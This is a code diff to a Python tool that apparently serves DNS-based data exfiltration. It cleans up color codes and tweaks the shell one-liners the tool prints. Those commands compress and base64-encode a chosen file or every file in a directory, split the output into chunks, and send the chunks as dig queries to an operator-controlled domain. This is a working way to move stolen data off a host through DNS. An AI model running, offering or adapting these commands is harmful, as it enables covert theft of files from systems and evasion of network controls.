@@ -16,13 +16,6 @@ from typing import Optional
 
 import structlog
 
-c = {
-    "r": "\033[1;31m",
-    "g": "\033[1;32m",
-    "y": "\033[1;33m",
-    "b": "\033[1;34m",
-    "e": "\033[0m",
-}
 VERSION = "2.0"
 
 DNS_QUESTION_INDEX = 12
@@ -265,32 +258,32 @@ def p_cmds(s, b, ip, z, domain, force_ip):
         logger.info(
             "Copy individual file (ZIP enabled)",
             cmd=(
-                f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
+                f"f=file.txt; s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
                 'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
                 f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`'
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short'
             ),
         )
         logger.info(
             "Copy entire folder (ZIP enabled)",
             cmd=(
-                f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
+                f"for f in $(ls .); do s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
                 'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
                 f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`; done;'
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short; done;'
             ),
         )
     else:
         logger.info(
             "Copy individual file",
             cmd=(
-                f"f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
+                f"f=file.txt; s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do '
-                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); '
-                f'else echo -ne "\\n$i-."; c=1; fi; done ); do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`'
+                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
+                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short'
             ),
         )
         logger.info(
@@ -298,9 +291,9 @@ def p_cmds(s, b, ip, z, domain, force_ip):
             cmd=(
                 f"for f in $(ls .); do s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do '
-                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else '
-                f'echo -ne "\\n$i-."; c=1; fi; done ); do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short; ix=$(($ix+1)); done; '
-                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`; done;'
+                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
+                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short; ix=$(($ix+1)); done; '
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short; done;'
             ),
         )
 
